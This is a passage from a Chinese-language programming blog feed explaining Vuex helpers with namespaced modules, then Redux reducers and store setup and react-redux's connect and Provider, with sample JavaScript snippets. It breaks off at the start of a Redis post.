<p><img src="https://www.zairesinatra.com/content/images/2021/12/vuex.png" alt="&#x7EC4;&#x4EF6;&#x901A;&#x8BAF;" loading="lazy"></p>
<p>getters &#x914D;&#x7F6E;&#x9879;&#x7684;&#x4EA7;&#x751F;&#x662F;&#x7531;&#x4E8E;&#x7EC4;&#x4EF6;&#x4E2D;&#x53EF;&#x80FD;&#x6D89;&#x53CA;&#x5230;&#x590D;&#x6742;&#x8DE8;&#x7EC4;&#x4EF6;&#x7684;&#x6570;&#x636E;&#x8FD0;&#x7B97;&#x590D;&#x7528;&#xFF0C;&#x800C; computed &#x5C5E;&#x6027;&#x867D;&#x7136;&#x53EF;&#x4EE5;&#x5B8C;&#x6210;&#x8FD0;&#x7B97;&#x529F;&#x80FD;&#xFF0C;&#x4F46;&#x5374;&#x4EC5;&#x80FD;&#x5728;&#x5F53;&#x524D;&#x7EC4;&#x4EF6;&#x4E2D;&#x751F;&#x6548;&#x4E0D;&#x80FD;&#x590D;&#x7528;&#x3002;</p>
<pre><code class="language-javascript">// store.js &#x8FFD;&#x52A0; getters &#x914D;&#x7F6E;
// getters &#x7528;&#x4E8E;&#x5BF9; Store &#x4E2D;&#x6570;&#x636E;&#x8FDB;&#x884C;&#x5305;&#x88C5;&#x52A0;&#x5DE5;&#x5904;&#x7406;&#x5F62;&#x6210;&#x65B0;&#x7684;&#x6570;&#x636E;&#xFF0C;&#x4E0D;&#x4F1A;&#x4FEE;&#x6539; Store &#x91CC;&#x7684;&#x539F;&#x6570;&#x636E;&#x3002;&#x7C7B;&#x4F3C;&#x4E8E; Vue &#x4E2D;&#x8BA1;&#x7B97;&#x5C5E;&#x6027;&#x3002;Store &#x4E2D;&#x6570;&#x636E;&#x53D1;&#x751F;&#x53D8;&#x5316;&#xFF0C;getters &#x91CC;&#x7684;&#x6570;&#x636E;&#x4E5F;&#x4F1A;&#x53D1;&#x751F;&#x53D8;&#x5316;&#x3002;
...
const getters = {
  showNum: state =&gt; {
    return &apos;&#x5F53;&#x524D;&#x6700;&#x65B0;&#x7684;&#x6570;&#x636E;&#x662F;[state.count*10]&apos;
  }
}
// &#x66B4;&#x9732;&#x8FFD;&#x52A0;
export default new Vuex.store({
  ...
  getters
})
</code></pre>
<pre><code class="language-javascript">// &#x8BFB;&#x53D6;&#x65B9;&#x5F0F;
// &#x4F7F;&#x7528; getters &#x7B2C;&#x4E00;&#x79CD;&#x65B9;&#x5F0F;
this.$store.getters.&#x540D;&#x79F0;
// &#x4F7F;&#x7528; getters &#x7684;&#x7B2C;&#x4E8C;&#x79CD;&#x65B9;&#x5F0F;
import { mapGetters } from &apos;vuex&apos;
computed: {
  ...mapGetters([&apos;&#x540D;&#x79F0;&apos;])
}
</code></pre>
<p>&#x5F00;&#x53D1;&#x4E2D;&#x6700;&#x597D;&#x4F7F;&#x7528;&#x7B80;&#x5355;&#x7684;&#x6A21;&#x677F;&#x8BED;&#x6CD5;&#x800C;&#x4E0D;&#x8981;&#x8FC7;&#x957F;&#x7684;&#x63D2;&#x503C;&#x8BED;&#x6CD5;&#x3002;&#x4F46;&#x662F;&#x5F53;&#x9879;&#x76EE;&#x8F83;&#x5927;&#xFF0C;&#x9700;&#x8981;&#x4F7F;&#x7528; store&#x3001;getters &#x91CC;&#x7684;&#x6570;&#x636E;&#x8FC7;&#x591A;&#xFF0C;&#x5C31;&#x96BE;&#x514D;&#x51FA;&#x73B0;&#x5F88;&#x591A;&#x7C7B;&#x4F3C; <code>{{$store.state|getters.xxx}}</code> &#x7684;&#x4EE3;&#x7801;&#x5757;&#x3002;&#x6B64;&#x65F6;&#x5F15;&#x5165; mapState&#x3001;mapGetters &#x6620;&#x5C04;&#x72B6;&#x6001;&#xFF0C;&#x5E76;&#x5411;&#x5176;&#x4F20;&#x9012; state &#x6216; getters &#x91CC;&#x7684;&#x53D8;&#x91CF;&#xFF0C;&#x53EF;&#x4EE5;&#x5E2E;&#x52A9;&#x7B80;&#x5316;&#x8BA1;&#x7B97;&#x5C5E;&#x6027;&#x53D6;&#x503C;&#x7684;&#x8FC7;&#x7A0B;&#x3002;</p>
<pre><code class="language-javascript">// components/A.vue
import { mapState, mapGetters } from &quot;vuex&quot;
...
computed:{
  // &#x501F;&#x52A9; mapState &#x751F;&#x6210;&#x8BA1;&#x7B97;&#x5C5E;&#x6027;
  ...mapState({a:&quot;a&quot;, b:&quot;b&quot;...}) // &#x65B9;&#x5F0F;&#x4E00;
  ...mapState([&quot;a&quot;, &quot;b&quot;...]) // &#x65B9;&#x5F0F;&#x4E8C;
  // &#x501F;&#x52A9; mapGetters &#x751F;&#x6210;&#x8BA1;&#x7B97;&#x5C5E;&#x6027;
  ...mapState({operateValA:&quot;operateValA&quot;, operateValB:&quot;operateValB&quot;...}) // &#x65B9;&#x5F0F;&#x4E00;
  ...mapState([&quot;operateValA&quot;, &quot;operateValB&quot;...]) // &#x65B9;&#x5F0F;&#x4E8C;
}
</code></pre>
<p>&#x540C;&#x7406;&#xFF0C;mapActions &#x548C; mapMutations &#x65B9;&#x6CD5;&#x7528;&#x4E8E;&#x5E2E;&#x52A9;&#x751F;&#x6210;&#x4E0E; actions &#x548C; mutations &#x5BF9;&#x8BDD;&#x7684;&#x65B9;&#x6CD5;&#xFF0C;&#x5373;&#x5305;&#x542B; <code>$store.dispatch()|commit()</code> &#x7684;&#x51FD;&#x6570;&#x3002;&#x503C;&#x5F97;&#x6CE8;&#x610F;&#x7684;&#x4E00;&#x70B9;&#xFF0C;&#x5728;&#x4F7F;&#x7528;&#x8FD9;&#x4E24;&#x79CD;&#x65B9;&#x6CD5;&#x65F6;&#xFF0C;&#x82E5;&#x9700;&#x8981;&#x4F20;&#x9012;&#x53C2;&#x6570;&#xFF0C;&#x5E94;&#x8BE5;&#x5728;&#x6A21;&#x677F;&#x4E2D;&#x7ED1;&#x5B9A;&#x65F6;&#x95F4;&#x65F6;&#x4F20;&#x9012;&#x597D;&#x53C2;&#x6570;&#xFF0C;&#x5426;&#x5219;&#x4F20;&#x9012;&#x7684;&#x53C2;&#x6570;&#x662F;&#x9ED8;&#x8BA4;&#x7684;&#x4E8B;&#x4EF6;&#x5BF9;&#x8C61;e&#x3002;</p>
<pre><code class="language-javascript">// components/A.vue
import { mapActions, mapMutations } from &quot;vuex&quot;
...
methods:{
  // &#x501F;&#x52A9; mapActions &#x751F;&#x6210;&#x8BA1;&#x7B97;&#x5C5E;&#x6027;
  ...mapActions({a:&quot;a&quot;, b:&quot;b&quot;...}) // &#x65B9;&#x5F0F;&#x4E00;
  ...mapActions([&quot;a&quot;, &quot;b&quot;...]) // &#x65B9;&#x5F0F;&#x4E8C;
  // &#x501F;&#x52A9; mapMutations &#x751F;&#x6210;&#x8BA1;&#x7B97;&#x5C5E;&#x6027;
  ...mapMutations({operateA:&quot;operateA&quot;, operateB:&quot;operateB&quot;...}) // &#x65B9;&#x5F0F;&#x4E00;
  ...mapMutations([&quot;operateA&quot;, &quot;operateB&quot;...]) // &#x65B9;&#x5F0F;&#x4E8C;
}
</code></pre>
<p>&#x5B9E;&#x9645;&#x5F00;&#x53D1;&#x4E2D;&#x4F7F;&#x7528;&#x6A21;&#x5757;&#x5316;&#x4E0E;&#x547D;&#x540D;&#x7A7A;&#x95F4;&#x7ED3;&#x5408;&#x7684; Vuex &#x53EF;&#x4EE5;&#x8BA9;&#x6570;&#x636E;&#x5206;&#x7C7B;&#x660E;&#x786E;&#x3002;&#x5728;&#x4F7F;&#x7528;&#x8FD9;&#x79CD;&#x6A21;&#x5F0F;&#x7684;&#x60C5;&#x51B5;&#x4E0B;&#xFF0C;&#x82E5;&#x501F;&#x52A9; mapXXX &#x65B9;&#x6CD5;&#x9700;&#x8981;&#x5728;&#x7B2C;&#x4E00;&#x4E2A;&#x53C2;&#x6570;&#x6307;&#x660E;&#x5177;&#x4F53;&#x6A21;&#x5757;&#xFF1B;&#x82E5;&#x4E0D;&#x501F;&#x52A9; mapXXX &#x65B9;&#x6CD5;&#x5219;&#x8981;&#x6CE8;&#x610F; / &#x5212;&#x5206;&#x7684;&#x5199;&#x6CD5;&#x3002;</p>
<pre><code class="language-javascript">// #&#x5F00;&#x542F;&#x547D;&#x540D;&#x7A7A;&#x95F4;&#x8BFB;&#x53D6; state &#x6570;&#x636E;
// &#x76F4;&#x63A5;&#x8BFB;&#x53D6;&amp;&#x501F;&#x52A9;mapState&#x8BFB;&#x53D6;
this.$store.state.personAbout.list&amp;...mapState(&quot;countAbout&quot;,[&quot;sum&quot;,&quot;place&quot;,&quot;field&quot;])
// #&#x5F00;&#x542F;&#x547D;&#x540D;&#x7A7A;&#x95F4;&#x8BFB;&#x53D6; getters &#x6570;&#x636E;
// &#x76F4;&#x63A5;&#x8BFB;&#x53D6;&amp;&#x501F;&#x52A9;mapGetters&#x8BFB;&#x53D6;
this.$store.getters[&quot;personAbout/firstPersonName&quot;]&amp;...mapGetters(&quot;countAbout&quot;,[&quot;bigSum&quot;])
// #&#x5F00;&#x542F;&#x547D;&#x540D;&#x7A7A;&#x95F4;&#x8C03;&#x7528; dispatch
// &#x76F4;&#x63A5;&#x8C03;&#x7528;&amp;&#x501F;&#x52A9;mapActions
this.$store.dispatch(&quot;personAbout/addPersonX&quot;,person)&amp;...mapActions(&quot;countAbout&quot;,{incrementOdd:&quot;jiaOdd&quot;,incrementWait:&quot;jiaWait&quot;})
// #&#x5F00;&#x542F;&#x547D;&#x540D;&#x7A7A;&#x95F4;&#x8C03;&#x7528; commit
// &#x76F4;&#x63A5;&#x8C03;&#x7528;&amp;&#x501F;&#x52A9;mapMutations
this.$store.commit(&quot;personAbout/ADD_PERSON&quot;,person)&amp;...mapMutations(&quot;countAbout&quot;,{increment:&quot;JIA&quot;,decrement:&quot;JIAN&quot;})
</code></pre>
<iframe src="https://codesandbox.io/embed/old-frost-1vsz4?fontsize=14&amp;hidenavigation=1&amp;theme=dark" style="width:100%; height:500px; border:0; border-radius: 4px; overflow:hidden;" title="modulevuex" allow="accelerometer; ambient-light-sensor; camera; encrypted-media; geolocation; gyroscope; hid; microphone; midi; payment; usb; vr; xr-spatial-tracking" sandbox="allow-forms allow-modals allow-popups allow-presentation allow-same-origin allow-scripts"></iframe><!--kg-card-end: markdown--><!--kg-card-begin: markdown--><h2 id="redux">Redux</h2>
<p>Redux &#x548C; React-redux &#x5E76;&#x975E;&#x540C;&#x4E00;&#x79CD;&#x4E1C;&#x897F;&#x3002;Redux &#x662F;&#x4E00;&#x79CD;&#x7531; Flux &#x67B6;&#x6784;&#x884D;&#x751F;&#x51FA;&#x6765;&#x7684;&#x65B0;&#x67B6;&#x6784;&#x6A21;&#x5F0F;&#x3002;React-redux &#x5C31;&#x662F;&#x628A; Redux &#x67B6;&#x6784;&#x6A21;&#x5F0F;&#x548C; React.js &#x7ED3;&#x5408;&#x8D77;&#x6765;&#x7684;&#x5B98;&#x65B9;&#x5E93;&#xFF0C;&#x5373; Redux &#x67B6;&#x6784;&#x5728; React &#x4E2D;&#x7684;&#x4F53;&#x73B0;&#x3002;&#x4F7F;&#x7528; redux &#x7BA1;&#x7406;&#x6570;&#x636E;&#x53EF;&#x4EE5;&#x907F;&#x514D;&#x88AB;&#x4EFB;&#x610F;&#x6A21;&#x5757;&#x4FEE;&#x6539;&#x5171;&#x4EAB;&#x6570;&#x636E;&#x72B6;&#x6001;&#x540E;&#x4EA7;&#x751F;&#x7684;&#x96BE;&#x4EE5;&#x9884;&#x6599;&#x7684;&#x7ED3;&#x679C;&#x3002;</p>
<p><img src="https://www.zairesinatra.com/content/images/2021/12/redux---.png" alt="&#x7EC4;&#x4EF6;&#x901A;&#x8BAF;" loading="lazy"></p>
<h3 id="%E5%BF%AB%E9%80%9F%E4%B8%8A%E6%89%8B">&#x5FEB;&#x901F;&#x4E0A;&#x624B;</h3>
<p>Store &#x5C31;&#x662F;&#x4FDD;&#x5B58;&#x6570;&#x636E;&#x7684;&#x5BB9;&#x5668;&#xFF0C;&#x6574;&#x4E2A;&#x5E94;&#x7528;&#x53EA;&#x80FD;&#x6709;&#x4E00;&#x4E2A;&#x3002;Redux &#x63D0;&#x4F9B; createStore &#x51FD;&#x6570;&#x7528;&#x6765;&#x751F;&#x6210; Store&#x3002;</p>
<pre><code class="language-javascript">/* 
  store.js
  &#x8BE5;&#x6587;&#x4EF6;&#x4E13;&#x95E8;&#x7528;&#x4E8E;&#x66B4;&#x9732;&#x4E00;&#x4E2A;store&#x5BF9;&#x8C61;&#xFF0C;&#x6574;&#x4E2A;&#x5E94;&#x7528;&#x53EA;&#x6709;&#x4E00;&#x4E2A;store&#x5BF9;&#x8C61;
*/

//&#x5F15;&#x5165;createStore&#xFF0C;&#x4E13;&#x95E8;&#x7528;&#x4E8E;&#x521B;&#x5EFA;redux&#x4E2D;&#x6700;&#x4E3A;&#x6838;&#x5FC3;&#x7684;store&#x5BF9;&#x8C61;
import { createStore, applyMiddleware } from &quot;redux&quot;;
//&#x5F15;&#x5165;&#x4E3A;Count&#x7EC4;&#x4EF6;&#x670D;&#x52A1;&#x7684;reducer
import countReducer from &quot;./count_reducer&quot;;
//&#x5F15;&#x5165;redux-thunk&#xFF0C;&#x7528;&#x4E8E;&#x652F;&#x6301;&#x5F02;&#x6B65;action
import thunk from &quot;redux-thunk&quot;;
//&#x66B4;&#x9732;store
export default createStore(countReducer, applyMiddleware(thunk));
</code></pre>
<p>Store &#x5BF9;&#x8C61;&#x5305;&#x542B;&#x6240;&#x6709;&#x6570;&#x636E;&#x3002;&#x901A;&#x8FC7; <code>store.getState()</code> &#x5BF9; Store &#x751F;&#x6210;&#x5FEB;&#x7167;&#xFF0C;&#x53EF;&#x4EE5;&#x5F97;&#x5230;&#x67D0;&#x4E2A;&#x8282;&#x70B9;&#x7684;&#x6570;&#x636E;&#x96C6;&#x5408; State&#x3002;</p>
<p>&#x867D;&#x7136;&#x7528;&#x6237;&#x63A5;&#x89E6;&#x4E0D;&#x5230; State&#xFF0C;&#x4F46;&#x662F;&#x9700;&#x8981; State &#x53D1;&#x751F;&#x53D8;&#x5316;&#xFF0C;&#x6B64;&#x65F6;&#x5C31;&#x5728; View &#x4E2D;&#x53D1;&#x51FA;&#x901A;&#x77E5; Action &#x7ED9; Store&#x3002;Action &#x672C;&#x8D28;&#x662F;&#x4E00;&#x4E2A;&#x5BF9;&#x8C61;&#xFF0C;&#x5305;&#x542B; type &#x548C; data &#x4E24;&#x79CD;&#x952E;&#x3002;&#x800C;&#x63A5;&#x53D7;&#x4E00;&#x4E2A; Action &#x5BF9;&#x8C61;&#x4F5C;&#x4E3A;&#x53C2;&#x6570;&#x7684; <code>store.dispatch()</code> &#x53C8;&#x662F; View &#x53D1;&#x51FA; Action &#x7684;&#x552F;&#x4E00;&#x65B9;&#x6CD5;&#x3002;</p>
<pre><code class="language-javascript">// Xx&#x7EC4;&#x4EF6;.js
store.dispatch(xxxAction(value))
</code></pre>
<pre><code class="language-javascript">// Xx&#x7EC4;&#x4EF6;_action.js
export const xxxOperateAction = (data) =&gt; ({ type: xxxOperate, data });
</code></pre>
<p>Store &#x6536;&#x5230; Action &#x4EE5;&#x540E;&#xFF0C;&#x5FC5;&#x987B;&#x7ED9;&#x51FA;&#x4E00;&#x4E2A;&#x65B0;&#x7684; State&#xFF0C;&#x8FD9;&#x6837; View &#x624D;&#x4F1A;&#x53D1;&#x751F;&#x53D8;&#x5316;&#x3002;&#x8FD9;&#x79CD; State &#x7684;&#x8BA1;&#x7B97;&#x8FC7;&#x7A0B;&#x5C31;&#x53EB;&#x505A; Reducer&#x3002;Reducer &#x662F;&#x4E00;&#x4E2A;&#x51FD;&#x6570;&#xFF0C;&#x5B83;&#x63A5;&#x53D7;&#x5F53;&#x524D; state &#x548C; action &#x4F5C;&#x4E3A;&#x53C2;&#x6570;&#xFF0C;&#x8FD4;&#x56DE;&#x4E00;&#x4E2A;&#x65B0;&#x7684; state&#x3002;</p>
<pre><code class="language-javascript">// Xx&#x7EC4;&#x4EF6;_reducer.js
const initState = 0; // &#x521D;&#x59CB;&#x5316;&#x72B6;&#x6001;
export default function xxReducer(preState = initState, action) {
  // redux&#x4F1A;&#x5728;&#x5F00;&#x59CB;&#x65F6;&#x8C03;&#x7528;
  // &#x6CA1;&#x6709;&#x4F20;&#x9012;preState&#x6216;&#x8005;&#x9ED8;&#x8BA4;&#x503C;&#x4E3A;undefined&#x5219;&#x4FEE;&#x6539;&#x4E3A;0
  // console.log(preState, action); // {type: &apos;@@redux/INIT1.6.3.4.l.f&apos;}
  if (preState === undefined) preState = 0;
  const { type, data } = action;
  switch (type) {
    case &quot;operate1&quot;:
      return preState ??? data;
    case &quot;operate2&quot;:
      return preState ??? data;
    default:
      // &#x521D;&#x59CB;&#x5316; Store -&gt; reducer &#x5524;&#x9192;&#x521D;&#x59CB;&#x5316;
      return preState;
  }
}
</code></pre>
<p>&#x5F00;&#x53D1;&#x4E2D;&#xFF0C;Reducer &#x7EAF;&#x51FD;&#x6570;&#x4E0D;&#x9700;&#x8981;&#x624B;&#x52A8;&#x8C03;&#x7528;&#xFF0C;<code>store.dispatch</code> &#x4F1A;&#x81EA;&#x52A8;&#x89E6;&#x53D1; Reducer &#x7684;&#x6267;&#x884C;&#x3002;&#x4E3A;&#x6B64;&#xFF0C;Store &#x9700;&#x8981;&#x77E5;&#x9053; Reducer &#x51FD;&#x6570;&#xFF0C;&#x8FD9;&#x5C31;&#x662F;&#x5728;&#x751F;&#x6210; Store &#x7684;&#x65F6;&#x5019;&#xFF0C;&#x4E3A;&#x4EC0;&#x4E48;&#x5C06; Reducer &#x4F5C;&#x4E3A;&#x53C2;&#x6570;&#x4F20;&#x5165; <code>createStore(xxxReducer)</code> &#x65B9;&#x6CD5;&#x7684;&#x539F;&#x56E0;&#x3002;Reducer &#x662F;&#x4E00;&#x4E2A;&#x540C;&#x6837;&#x7684;&#x8F93;&#x5165;&#xFF0C;&#x5FC5;&#x5B9A;&#x5F97;&#x5230;&#x540C;&#x6837;&#x7684;&#x8F93;&#x51FA;&#x7684;&#x7EAF;&#x51FD;&#x6570;&#x3002;&#x6545;&#x5728;&#x6B64;&#x51FD;&#x6570;&#x4E2D;&#x4E0D;&#x80FD;&#x8C03;&#x7528;&#x7CFB;&#x7EDF; I/O &#x548C; <code>Date.now()</code>&#x3001;<code>Math.random()</code> &#x7B49;&#x4E0D;&#x7EAF;&#x7684;&#x65B9;&#x6CD5;&#xFF0C;&#x907F;&#x514D;&#x5F97;&#x5230;&#x4E0D;&#x4E00;&#x6837;&#x7684;&#x7ED3;&#x679C;&#x3002;</p>
<p>Store &#x5141;&#x8BB8;&#x4F7F;&#x7528; <code>store.subscribe(()=&gt;{})</code> &#x65B9;&#x6CD5;&#x8BBE;&#x7F6E;&#x76D1;&#x542C;&#x51FD;&#x6570;&#xFF0C;&#x4E00;&#x65E6; State &#x53D1;&#x751F;&#x53D8;&#x5316;&#xFF0C;&#x5C31;&#x81EA;&#x52A8;&#x6267;&#x884C;&#x8FD9;&#x4E2A;&#x51FD;&#x6570;&#x3002;</p>
<iframe src="https://codesandbox.io/embed/redux-2dl66?fontsize=14&amp;hidenavigation=1&amp;theme=dark" style="width:100%; height:500px; border:0; border-radius: 4px; overflow:hidden;" title="redux" allow="accelerometer; ambient-light-sensor; camera; encrypted-media; geolocation; gyroscope; hid; microphone; midi; payment; usb; vr; xr-spatial-tracking" sandbox="allow-forms allow-modals allow-popups allow-presentation allow-same-origin allow-scripts"></iframe>
<p>Reducer &#x51FD;&#x6570;&#x8D1F;&#x8D23;&#x64CD;&#x4F5C;&#x3001;&#x751F;&#x6210; State&#x3002;&#x7531;&#x4E8E;&#x6574;&#x4E2A;&#x5E94;&#x7528;&#x53EA;&#x6709;&#x4E00;&#x4E2A; State &#x5BF9;&#x8C61;&#xFF0C;&#x90A3;&#x4E48;&#x5BF9;&#x4E8E;&#x5927;&#x578B;&#x5E94;&#x7528;&#x6765;&#x8BF4;&#xFF0C;&#x5176; State &#x548C; Reducer &#x7684;&#x4F53;&#x91CF;&#x5FC5;&#x7136;&#x5341;&#x5206;&#x5E9E;&#x5927;&#x3002;Redux &#x63D0;&#x4F9B;&#x4E86; <code>combineReducers</code> &#x65B9;&#x6CD5;&#xFF0C;&#x7528;&#x4E8E; Reducer &#x7684;&#x62C6;&#x5206;&#x3002;&#x53EA;&#x8981;&#x5B9A;&#x4E49;&#x5404;&#x4E2A;&#x5B50; Reducer &#x51FD;&#x6570;&#xFF0C;&#x5C31;&#x53EF;&#x4EE5;&#x7528;&#x8FD9;&#x4E2A;&#x65B9;&#x6CD5;&#x5C06;&#x5176;&#x5408;&#x6210;&#x603B;&#x7684; Reducer&#x3002;</p>
<pre><code class="language-javascript">import { combineReducers } from &apos;redux&apos;;
...
const reducer = combineReducers({
  a: doSomethingWithA,
  b: processB,
  c: c
})

// &#x7B49;&#x540C;&#x4E8E;
function reducer(state = {}, action) {
  return {
    a: doSomethingWithA(state.a, action),
    b: processB(state.b, action),
    c: c(state.c, action)
  }
}
</code></pre>
<h3 id="react-redux">react-redux</h3>
<p>&#x4F7F;&#x7528; facebook &#x5B98;&#x65B9;&#x7684;&#x63D2;&#x4EF6; react-redux &#x53EF;&#x4EE5;&#x5728; React &#x4E2D;&#x66F4;&#x52A0;&#x65B9;&#x4FBF;&#x7684;&#x4F7F;&#x7528; redux&#x3002;</p>
<p><img src="https://www.zairesinatra.com/content/images/2021/12/react-redux---.png" alt="&#x7EC4;&#x4EF6;&#x901A;&#x8BAF;" loading="lazy"></p>
<h4 id="%E8%BF%9E%E6%8E%A5%E5%AE%B9%E5%99%A8%E7%BB%84%E4%BB%B6%E5%92%8Cui%E7%BB%84%E4%BB%B6">&#x8FDE;&#x63A5;&#x5BB9;&#x5668;&#x7EC4;&#x4EF6;&#x548C;UI&#x7EC4;&#x4EF6;</h4>
<p>&#x5BB9;&#x5668;&#x7EC4;&#x4EF6;&#x4E0E;UI&#x7EC4;&#x4EF6;&#x7684;&#x8FDE;&#x63A5;&#x4F7F;&#x7528;&#x51FD;&#x6570; <code>connect()()</code>&#x3002;&#x7531;&#x4E8E;&#x5BB9;&#x5668;&#x7EC4;&#x4EF6;&#x9700;&#x8981;&#x7ED9;UI&#x7EC4;&#x4EF6;&#x4F20;&#x9012;&#x72B6;&#x6001;&#x548C;&#x65B9;&#x6CD5;&#xFF0C;&#x800C;&#x53C8;&#x4E0D;&#x540C;&#x4E8E;&#x6807;&#x7B7E;&#x5C55;&#x793A;&#x7684;&#x7EC4;&#x4EF6;&#x80FD;&#x76F4;&#x63A5;&#x4F20;&#x9012;&#x5C5E;&#x6027;&#x53C2;&#x6570;&#x3002;&#x53EA;&#x80FD;&#x4F7F;&#x7528;&#x51FD;&#x6570;&#x7684;&#x5BF9;&#x8C61;&#x5F62;&#x5F0F;&#x7684;&#x8FD4;&#x56DE;&#x503C;&#x4F5C;&#x4E3A;&#x53C2;&#x6570;&#x4F20;&#x9012;&#x7ED9; connect&#xFF0C;&#x8FD9;&#x91CC;&#x7684;&#x5BF9;&#x8C61;&#x5F62;&#x5F0F;&#x8FD4;&#x56DE;&#x503C;&#xFF0C;&#x9700;&#x8981;&#x5305;&#x62EC;&#x72B6;&#x6001;&#x548C;&#x65B9;&#x6CD5;&#x3002;</p>
<pre><code class="language-javascript">// containers/Xxx
// &#x5F15;&#x5165;Xxx&#x7684;UI&#x7EC4;&#x4EF6;
import XxxUI from &quot;../../component/Xxx&quot;
import {operateXXXAction} from &quot;../../redux/xxx_action&quot;
// &#x5F15;&#x5165;connect&#x8FDE;&#x63A5;UI&#x7EC4;&#x4EF6;&#x548C;redux
import {connect} from &quot;react-redux&quot;
// func &#x51FD;&#x6570;&#x8FD4;&#x56DE;&#x7684;&#x5BF9;&#x8C61;key&#x4F5C;&#x4E3A;&#x4F20;&#x9012;&#x7ED9;UI&#x7EC4;&#x4EF6;props&#x7684;key,value
function func(state){return {...stateVal:state...}}
// func &#x51FD;&#x6570;&#x8FD4;&#x56DE;&#x7684;&#x5BF9;&#x8C61;key&#x4F5C;&#x4E3A;&#x4F20;&#x9012;&#x7ED9;UI&#x7EC4;&#x4EF6;props&#x7684;key,value
function funcc(dispatch){return {...operateway:(args)=&gt;{dispatch(operateXXXAction(args))}...}}
// &#x4F7F;&#x7528;connect()()&#x521B;&#x5EFA;&#x5E76;&#x66B4;&#x9732;&#x4E00;&#x4E2A;Xxx&#x5BB9;&#x5668;&#x7EC4;&#x4EF6;
export default connect(func,funcc)(XxxUI)
</code></pre>
<p>&#x5B9E;&#x9645;&#x4E0A; func &#x548C; funcc &#x7684;&#x6B63;&#x786E;&#x540D;&#x79F0;&#x4E3A; mapStateToProps &#x548C; mapDispatchToProps&#xFF0C;&#x5373;&#x628A; props &#x53D8;&#x4E3A; state &#x4F20;&#x7ED9;UI&#x7EC4;&#x4EF6;&#x548C;&#x5C06;&#x64CD;&#x4F5C;&#x72B6;&#x6001;&#x7684;&#x65B9;&#x6CD5;&#x6620;&#x5C04;&#x7ED9;UI&#x7EC4;&#x4EF6;&#x3002;</p>
<pre><code class="language-javascript">// &#x6838;&#x5FC3;&#x4EE3;&#x7801;
export default connect(mapStateToProps,mapDispatchToProps)(UIComponent)
</code></pre>
<p>&#x5BB9;&#x5668;&#x7EC4;&#x4EF6;&#x7684; store &#x53EF;&#x4EE5;&#x76F4;&#x63A5;&#x5728; app.jsx &#x4E2D;&#x4EE5;&#x6807;&#x7B7E;&#x5C5E;&#x6027;&#x7684;&#x5F62;&#x5F0F;&#x6DFB;&#x52A0;&#xFF0C;&#x4F46;&#x662F;&#x5982;&#x679C;&#x4F7F;&#x7528; redux &#x7684;&#x7EC4;&#x4EF6;&#x8FC7;&#x591A;&#xFF0C;&#x53EF;&#x4EE5;&#x4F7F;&#x7528; react-redux &#x63D0;&#x4F9B;&#x7684; &lt;Provider /&gt; &#x7EC4;&#x4EF6;&#x8FDB;&#x884C;&#x6CE8;&#x5165; <code>store={store}</code> &#x5C5E;&#x6027;&#x540E;&#x5305;&#x88F9;&#x6839;&#x7EC4;&#x4EF6;&#x5B8C;&#x6210;&#x4F18;&#x5316;&#x3002;</p>
<pre><code class="language-javascript">// &#x4F18;&#x5316;&#x524D;
// App.jsx
import React, { Component } from &quot;react&quot;;
import {store} from &quot;./redux/store&quot;
import Xxx from &quot;./containers/Xxx/index.jsx&quot;;

export default class App extends Component {
  render() {
    return (
      &lt;div&gt;
        &lt;Xxx state={state}/&gt;
        ...
      &lt;/div&gt;
    );
  }
}
</code></pre>
<pre><code class="language-javascript">// &#x4F18;&#x5316;&#x540E;
// index.js
import React from &quot;react&quot;;
import ReactDOM from &quot;react-dom&quot;;
import App from &quot;./App&quot;;
import store from &quot;./redux/store&quot;;
import { Provider } from &quot;react-redux&quot;;

ReactDOM.render(
  &lt;Provider store={store}&gt;
    &lt;App /&gt;
  &lt;/Provider&gt;,
  document.getElementById(&quot;root&quot;)
);
</code></pre>
<iframe src="https://codesandbox.io/embed/react-redux-e4y0v?fontsize=14&amp;hidenavigation=1&amp;theme=dark" style="width:100%; height:500px; border:0; border-radius: 4px; overflow:hidden;" title="react-redux" allow="accelerometer; ambient-light-sensor; camera; encrypted-media; geolocation; gyroscope; hid; microphone; midi; payment; usb; vr; xr-spatial-tracking" sandbox="allow-forms allow-modals allow-popups allow-presentation allow-same-origin allow-scripts"></iframe><!--kg-card-end: markdown--><!--kg-card-begin: markdown--><h2 id="%E7%BB%93%E6%9D%9F">&#x7ED3;&#x675F;</h2>
<p>&#x672C;&#x535A;&#x5BA2;&#x6240;&#x6709;&#x6587;&#x7AE0;&#x9664;&#x7279;&#x522B;&#x58F0;&#x660E;&#x5916;&#xFF0C;&#x5747;&#x91C7;&#x7528; <a href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh">CC BY-SA 4.0 &#x534F;&#x8BAE;</a>&#xFF0C;&#x8F6C;&#x8F7D;&#x8BF7;&#x6CE8;&#x660E;&#x51FA;&#x5904;&#xFF01;</p>
<!--kg-card-end: markdown-->]]></content:encoded></item><item><title><![CDATA[Redis]]></title><description><![CDATA[redis => 6379]]></description><link>yourdomain.com/redis/</link><guid isPermaLink="false">6159ea764716ef1a9649e488</guid><category><![CDATA[Technology growth]]></category><dc:creator><![CDATA[Ziyi Xie]]></dc:creator><pubDate>Wed, 29 Sep 2021 13:20:00 GMT</pubDate><media:content url="yourdomain.com/content/images/2022/06/redisbyzs.png" medium="image"/><content:encoded><![CDATA[<!--kg-card-begin: markdown--><h2 id="%E5%BF%AB%E9%80%9F%E4%B8%8A%E6%89%8B">&#x5FEB;&#x901F;&#x4E0A;&#x624B;</h2>
<img src="yourdomain.com/content/images/2022/06/redisbyzs.png" alt="Redis"><p>NoSQL Not Only SQL &#x6CDB;&#x6307;&#x975E;&#x5173;&#x7CFB;&#x578B;&#x7684;&#x6570;&#x636E;&#x5E93;&#xFF0C;&#x4EE5; Key-Value &#x5B58;&#x50A8;&#x3002;Redis &#x662F;&#x4E00;&#x6B3E;&#x5F00;&#x6E90;&#x7684;&#x5185;&#x5B58;&#x6570;&#x636E;&#x5B58;&#x50A8;&#x7CFB;&#x7EDF;&#xFF0C;&#x53EF;&#x7528;&#x4F5C;&#x6570;&#x636E;&#x5E93;&#x3001;&#x7F13;&#x5B58;&#x548C;&#x6D88;&#x606F;&#x4E2D;&#x95F4;&#x4EF6;&#x3002;&#x5176;&#x9ED8;&#x8BA4;&#x5177;&#x6709; 16 &#x4E2A;&#x6570;&#x636E;&#x5E93;&#xFF0C;&#x53EF;&#x4F7F;&#x7528; select [index] &#x8FDB;&#x884C;&#x5207;&#x6362;&#x3002;</p>
<table>
<thead>
<tr>
